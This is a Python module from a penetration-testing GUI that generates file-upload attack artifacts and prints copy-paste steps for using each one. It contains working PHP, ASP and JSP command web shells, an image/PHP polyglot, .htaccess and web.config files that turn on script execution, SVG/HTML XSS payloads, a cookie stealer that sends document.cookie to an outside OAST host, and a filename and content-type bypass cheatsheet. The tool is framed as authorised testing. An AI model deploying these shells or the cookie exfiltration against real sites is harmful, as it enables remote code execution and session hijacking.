"""
File Upload Testing lab.

Generates standard, non-destructive file-upload test artifacts locally (into
<output_dir>/upload_tests/) for authorised penetration testing of upload
functionality, and prints how to use each one plus a copy-paste PoC. No files
are uploaded or sent anywhere — the tester uploads them manually via Burp/the
browser against authorised targets only.

Artifacts: EICAR AV test files, PHP/ASP/JSP command web shells, an image/PHP
polyglot, an SVG/HTML stored-XSS payload, a Collaborator cookie-stealer (asks
for the tester's own OAST URL), .htaccess / web.config execution-bypass helpers,
and a malicious-filename cheatsheet. All PoCs use a benign command (id/whoami)
or alert(document.domain).
"""
from pathlib import Path

from PyQt6.QtWidgets import QInputDialog, QLineEdit

# Industry-standard EICAR anti-virus test string (benign by design).
EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

PHP_SHELL = (
    "<?php\n"
    "// Authorised testing only. Non-destructive PoC command runner.\n"
    "if (isset($_GET['cmd'])) { echo '<pre>'; system($_GET['cmd']); echo '</pre>'; }\n"
    "?>\n"
)
PHP_POLYGLOT = (
    "GIF89a;\n"
    "<?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>\n"
)
ASP_SHELL = (
    '<%\n'
    'Dim cmd : cmd = Request.QueryString("cmd")\n'
    'If cmd <> "" Then\n'
    '  Response.Write("<pre>" & CreateObject("WScript.Shell").Exec("cmd /c " & cmd).StdOut.ReadAll() & "</pre>")\n'
    'End If\n'
    '%>\n'
)
JSP_SHELL = (
    '<%@ page import="java.io.*" %>\n'
    '<%\n'
    '  String cmd = request.getParameter("cmd");\n'
    '  if (cmd != null) {\n'
    '    Process p = Runtime.getRuntime().exec(cmd);\n'
    '    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n'
    '    String line; out.println("<pre>");\n'
    '    while ((line = r.readLine()) != null) { out.println(line); }\n'
    '    out.println("</pre>");\n'
    '  }\n'
    '%>\n'
)
SVG_XSS = (
    '<?xml version="1.0" standalone="no"?>\n'
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)" width="1" height="1"/>\n'
)
HTML_XSS = (
    "<!doctype html><html><body>\n"
    "<script>alert(document.domain)</script>\n"
    "</body></html>\n"
)
HTACCESS = (
    "# Drop alongside an uploaded image shell so Apache executes it as PHP.\n"
    "AddType application/x-httpd-php .jpg .png .gif\n"
    "# Alternative:\n"
    "# AddHandler application/x-httpd-php .jpg\n"
)
WEBCONFIG = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<configuration>\n'
    '  <system.webServer>\n'
    '    <handlers accessPolicy="Read, Script, Write">\n'
    '      <add name="cb-asp" path="*.config" verb="*" '
    'modules="IsapiModule" scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" '
    'resourceType="Unspecified" requireAccess="Write" />\n'
    '    </handlers>\n'
    '  </system.webServer>\n'
    '</configuration>\n'
    '<!-- web.config can sometimes itself be executed on IIS; test carefully. -->\n'
)
FILENAME_CHEATSHEET = """File Upload — Bypass Filename / Content-Type Cheatsheet (authorised testing only)
================================================================================
Extension bypasses:
  shell.php.jpg          (double extension)
  shell.jpg.php
  shell.pHp / shell.PhP  (case)
  shell.phtml .php3 .php4 .php5 .php7 .phar  (alternative PHP handlers)
  shell.asp;.jpg         (IIS semicolon trick)
  shell.aspx .asp .cer .asa
  shell.jsp .jspx .jsw .jsv
  shell%00.jpg           (null byte — legacy stacks)
  shell.php............  (trailing dots / spaces)
  shell.php%20 / shell.php.

Content-Type spoof (keep the shell body, change the header in Burp):
  Content-Type: image/jpeg
  Content-Type: image/png
  Content-Type: image/gif

Magic-byte prefixes (prepend to the shell so it passes image validation):
  GIF89a;          (GIF)
  \\xFF\\xD8\\xFF    (JPEG SOI)
  \\x89PNG\\r\\n    (PNG)

Path traversal in the filename field:
  ../../../../var/www/html/shell.php
  ..%2f..%2f..%2fshell.php

Other ideas:
  .htaccess / web.config (change handler so images execute) — see those buttons.
  SVG with embedded JS (stored XSS) — see the SVG/HTML XSS button.
  Polyglot GIF/PHP — see the PHP polyglot button.

Always verify SERVER-SIDE: type/magic-byte checks, extension allow-listing,
stored location (web-root vs out-of-web-root), direct object access, and whether
the uploaded file is executed.
"""


class FileUploadLabMixin:
    """Web tab → File Upload Testing handlers (generate artifacts locally)."""

    def _upload_dir(self):
        d = Path(self.output_dir) / "upload_tests"
        try:
            d.mkdir(parents=True, exist_ok=True)
        except Exception:
            pass
        return d

    def _save_upload_files(self, files, title, usage):
        """files: list of (name, content). Writes them and prints usage."""
        d = self._upload_dir()
        written = []
        for name, content in files:
            try:
                (d / name).write_text(content, encoding="utf-8", errors="replace")
                written.append(name)
            except Exception as e:
                self.console.append_ansi(f"[!] Could not write {name}: {e}\n")
        try:
            self.goto_console()
        except Exception:
            pass
        self.console.append_ansi("\n" + "=" * 80 + "\n")
        self.console.append_ansi(f"[*] File Upload Test: {title}\n")
        self.console.append_ansi("=" * 80 + "\n")
        for name in written:
            self.console.append_ansi(f"[+] Saved: upload_tests/{name}\n")
        self.console.append_ansi("\n" + usage.strip() + "\n")
        self.console.append_ansi(
            "\n[i] Authorised testing only. Upload these manually via Burp/the browser.\n"
        )
        try:
            self.refresh_file_list()
        except Exception:
            pass

    # ── Buttons ─────────────────────────────────────────────────────────────
    def upload_eicar(self):
        files = [
            ("eicar.com", EICAR), ("eicar.com.txt", EICAR),
            ("eicar.png", EICAR), ("eicar.pdf", EICAR),
        ]
        self._save_upload_files(
            files, "EICAR Anti-Virus Test Files",
            "Upload each file. If antivirus/upload scanning is present it should reject or "
            "quarantine them. If they upload AND are retrievable, the upload pipeline is NOT "
            "scanning content. The .png/.pdf variants also test extension-based scanning. "
            "Report: 'EICAR test file accepted and stored — no malware scanning on upload.'")

    def upload_php_shell(self):
        files = [
            ("shell.php", PHP_SHELL), ("shell.php.jpg", PHP_SHELL),
            ("shell.phtml", PHP_SHELL), ("shell.pHp", PHP_SHELL),
        ]
        self._save_upload_files(
            files, "PHP Command Web Shell (+ extension variants)",
            "After upload, browse to the file and append a benign command, e.g.:\n"
            "    https://TARGET/uploads/shell.php?cmd=id\n"
            "    https://TARGET/uploads/shell.php?cmd=whoami\n"
            "If output of 'id'/'whoami' is returned, RCE is proven. Try the .php.jpg / .phtml / "
            ".pHp variants if .php is blocked. Keep the command non-destructive for the PoC.")

    def upload_php_polyglot(self):
        self._save_upload_files(
            [("polyglot.gif", PHP_POLYGLOT), ("image.php", PHP_POLYGLOT)],
            "Image/PHP Polyglot (GIF89a magic bytes)",
            "Begins with 'GIF89a;' so it passes magic-byte/image validation while remaining valid "
            "PHP. Upload, then request it via a path that PHP executes and append ?cmd=id. "
            "Pair with the .htaccess helper if the server only executes specific extensions.")

    def upload_asp_jsp_shells(self):
        self._save_upload_files(
            [("shell.asp", ASP_SHELL), ("shell.aspx", ASP_SHELL), ("shell.jsp", JSP_SHELL)],
            "Classic ASP / ASPX / JSP Web Shells",
            "For IIS/.NET or Java/Tomcat stacks. After upload, browse to the file with ?cmd=whoami "
            "(ASP/ASPX) or ?cmd=id (JSP). IIS tip: try 'shell.asp;.jpg' if .asp is blocked.")

    def upload_svg_html_xss(self):
        self._save_upload_files(
            [("xss.svg", SVG_XSS), ("xss.html", HTML_XSS)],
            "SVG / HTML Stored-XSS Upload",
            "Upload as an avatar/image/document. If the app serves the SVG/HTML inline (same origin) "
            "rather than as an attachment, the JS executes → stored XSS. PoC fires "
            "alert(document.domain). If it downloads or is served with Content-Disposition: "
            "attachment / a non-HTML type, document it as not exploitable.")

    def upload_cookie_stealer(self):
        url, ok = QInputDialog.getText(
            self, "Cookie Stealer — OAST URL",
            "Enter YOUR Burp Collaborator / OAST URL to embed (authorised testing only):",
            QLineEdit.EchoMode.Normal, "https://YOUR-id.oastify.com",
        )
        if not ok or not url.strip():
            return
        url = url.strip().replace('"', "").replace("'", "")
        svg = (
            '<?xml version="1.0" standalone="no"?>\n'
            '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" '
            f'onload="fetch(\'{url}?c=\'+encodeURIComponent(document.cookie))"/>\n'
        )
        html_file = (
            "<!doctype html><html><body><script>\n"
            f"new Image().src='{url}?c='+encodeURIComponent(document.cookie);\n"
            "</script></body></html>\n"
        )
        self._save_upload_files(
            [("cookie_stealer.svg", svg), ("cookie_stealer.html", html_file)],
            "Cookie Stealer (exfil to your Collaborator)",
            f"Embeds your OAST URL ({url}). If the uploaded file is rendered inline in a victim's "
            "authenticated context, their document.cookie is sent to your Collaborator. Watch the "
            "Collaborator tab for an HTTP interaction. Only works for non-HttpOnly cookies and when "
            "the file is served same-origin/inline. Use only against authorised targets.")

    def upload_handler_bypass(self):
        self._save_upload_files(
            [(".htaccess", HTACCESS), ("web.config", WEBCONFIG)],
            ".htaccess / web.config Execution-Bypass Helpers",
            "If the upload directory allows these, .htaccess (Apache) can make images execute as "
            "PHP, and web.config (IIS) can alter handlers. Upload the helper, then upload an image "
            "shell (e.g. shell.jpg containing PHP) and request it. Confirms missing server-side "
            "controls on uploaded config files.")

    def upload_filename_cheatsheet(self):
        self._save_upload_files(
            [("upload_filename_tricks.txt", FILENAME_CHEATSHEET)],
            "Bad-Filename / Content-Type Cheatsheet",
            "Reference list of extension, content-type, magic-byte and path-traversal bypasses to "
            "try in Burp when a straightforward upload is blocked. Not an upload payload itself.")
